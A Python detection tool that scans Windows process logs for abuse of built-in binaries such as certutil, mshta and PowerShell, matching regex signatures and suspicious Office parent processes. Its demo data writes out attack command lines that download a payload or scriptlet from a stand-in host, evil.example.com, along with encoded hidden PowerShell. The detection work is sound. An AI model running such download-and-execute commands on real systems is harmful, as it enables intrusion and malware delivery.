#!/usr/bin/env python3
"""Living off the land (LOLBin) attack detection agent.

Monitors process creation logs for suspicious use of legitimate Windows
binaries, correlates with LOLBAS project data, and flags anomalous
command-line patterns and parent-child process relationships.
"""

import argparse
import json
import os
import re
import sys
import datetime

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


LOLBIN_SIGNATURES = {
    "certutil.exe": {
        "suspicious_args": [
            r"-urlcache", r"-split", r"-decode", r"-encode",
            r"-verifyctl", r"http[s]?://",
        ],
        "mitre": ["T1140", "T1105"],
        "description": "Certificate utility abused for file download/decode",
    },
    "mshta.exe": {
        "suspicious_args": [r"javascript:", r"vbscript:", r"http[s]?://", r"about:"],
        "mitre": ["T1218.005"],
        "description": "HTML Application host used for script execution",
    },
    "rundll32.exe": {
        "suspicious_args": [
            r"javascript:", r"shell32\.dll.*ShellExec_RunDLL",
            r"url\.dll.*FileProtocolHandler", r"advpack\.dll.*RegisterOCX",
        ],
        "mitre": ["T1218.011"],
        "description": "DLL loader abused for proxy execution",
    },
    "regsvr32.exe": {
        "suspicious_args": [r"/s", r"/u", r"/i:http", r"scrobj\.dll"],
        "mitre": ["T1218.010"],
        "description": "COM registration utility abused for script execution",
    },
    "msbuild.exe": {
        "suspicious_args": [r"\.xml$", r"\.csproj$", r"/p:", r"\.tmp"],
        "mitre": ["T1127.001"],
        "description": "Build tool abused for code compilation and execution",
    },
    "installutil.exe": {
        "suspicious_args": [r"/logfile=", r"/LogToConsole=false", r"/U"],
        "mitre": ["T1218.004"],
        "description": ".NET install utility abused for code execution",
    },
    "bitsadmin.exe": {
        "suspicious_args": [r"/transfer", r"/create", r"/addfile", r"http[s]?://"],
        "mitre": ["T1197", "T1105"],
        "description": "BITS service abused for file download and persistence",
    },
    "wmic.exe": {
        "suspicious_args": [
            r"process\s+call\s+create", r"os\s+get", r"/node:",
            r"shadowcopy\s+delete",
        ],
        "mitre": ["T1047"],
        "description": "WMI command-line abused for execution and recon",
    },
    "cscript.exe": {
        "suspicious_args": [r"\.vbs", r"\.js", r"//E:jscript", r"//B"],
        "mitre": ["T1059.005", "T1059.007"],
        "description": "Script host executing VBS/JS from unusual location",
    },
    "powershell.exe": {
        "suspicious_args": [
            r"-enc\s+[A-Za-z0-9+/=]{20,}", r"-ExecutionPolicy\s+Bypass",
            r"-WindowStyle\s+Hidden", r"Invoke-Expression",
            r"IEX\s*\(", r"Net\.WebClient", r"DownloadString",
        ],
        "mitre": ["T1059.001"],
        "description": "PowerShell with obfuscation or download cradle",
    },
}

SUSPICIOUS_PARENTS = {
    "winword.exe": "Office application spawning child process",
    "excel.exe": "Office application spawning child process",
    "outlook.exe": "Email client spawning child process",
    "powerpnt.exe": "Office application spawning child process",
    "wmiprvse.exe": "WMI provider executing child process",
    "svchost.exe": "Service host spawning unexpected child",
}


def analyze_process_event(process_name, command_line, parent_name=None):
    """Analyze a process creation event for LOLBin abuse."""
    findings = []
    proc_lower = process_name.lower()
    cmd_lower = command_line.lower() if command_line else ""

    sig = LOLBIN_SIGNATURES.get(proc_lower)
    if sig:
        matched_patterns = []
        for pattern in sig["suspicious_args"]:
            if re.search(pattern, cmd_lower, re.IGNORECASE):
                matched_patterns.append(pattern)
        if matched_patterns:
            findings.append({
                "type": "lolbin_abuse",
                "binary": proc_lower,
                "description": sig["description"],
                "mitre_techniques": sig["mitre"],
                "matched_patterns": matched_patterns,
                "command_line": command_line[:200],
                "severity": "HIGH",
            })

    if parent_name and parent_name.lower() in SUSPICIOUS_PARENTS:
        findings.append({
            "type": "suspicious_parent",
            "parent": parent_name.lower(),
            "child": proc_lower,
            "description": SUSPICIOUS_PARENTS[parent_name.lower()],
            "severity": "HIGH",
        })

    return findings


def scan_process_log(log_entries):
    """Scan a list of process creation log entries."""
    all_findings = []
    for entry in log_entries:
        findings = analyze_process_event(
            entry.get("process_name", ""),
            entry.get("command_line", ""),
            entry.get("parent_name"),
        )
        if findings:
            entry_result = {"event": entry, "findings": findings}
            all_findings.append(entry_result)
    return all_findings


def fetch_lolbas_data():
    """Fetch LOLBAS project data from GitHub."""
    if not HAS_REQUESTS:
        return {"error": "requests not installed"}
    url = "https://lolbas-project.github.io/api/lolbas.json"
    try:
        resp = requests.get(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            return {"count": len(data), "binaries": [d.get("Name", "") for d in data[:30]]}
        return {"error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"error": str(e)}


def main():
    parser = argparse.ArgumentParser(
        description="Detect living off the land (LOLBin) attacks"
    )
    parser.add_argument("--log-file", help="JSON file with process creation events")
    parser.add_argument("--fetch-lolbas", action="store_true", help="Fetch LOLBAS project data")
    parser.add_argument("--output", "-o", help="Output JSON report path")
    args = parser.parse_args()

    print("[*] Living Off the Land Attack Detection Agent")
    print(f"    Monitored LOLBins: {len(LOLBIN_SIGNATURES)}")

    report = {"timestamp": datetime.datetime.utcnow().isoformat() + "Z"}

    if args.fetch_lolbas:
        lolbas = fetch_lolbas_data()
        report["lolbas_project"] = lolbas
        print(f"[*] LOLBAS data: {lolbas}")

    if args.log_file and os.path.isfile(args.log_file):
        with open(args.log_file) as f:
            events = json.load(f)
        results = scan_process_log(events)
        report["findings"] = results
        print(f"[*] Events analyzed: {len(events)}")
        print(f"[*] Suspicious findings: {len(results)}")
    else:
        demo_events = [
            {"process_name": "certutil.exe",
             "command_line": "certutil.exe -urlcache -split -f https://evil.example.com/payload.exe C:\\temp\\payload.exe",
             "parent_name": "cmd.exe"},
            {"process_name": "mshta.exe",
             "command_line": "mshta.exe javascript:a=GetObject('script:https://evil.example.com/s.sct')",
             "parent_name": "winword.exe"},
            {"process_name": "powershell.exe",
             "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgA...",
             "parent_name": "excel.exe"},
            {"process_name": "notepad.exe",
             "command_line": "notepad.exe C:\\Users\\admin\\notes.txt",
             "parent_name": "explorer.exe"},
        ]
        results = scan_process_log(demo_events)
        report["findings"] = results
        print(f"\n[DEMO] Analyzed {len(demo_events)} process events")
        for r in results:
            for f in r["findings"]:
                print(f"  [!] {f['type']}: {f['binary'] if 'binary' in f else f.get('child','')} "
                      f"- {f['description']}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2)

    print(json.dumps({"lolbins_monitored": len(LOLBIN_SIGNATURES),
                       "findings": len(report.get("findings", []))}, indent=2))


if __name__ == "__main__":
    main()
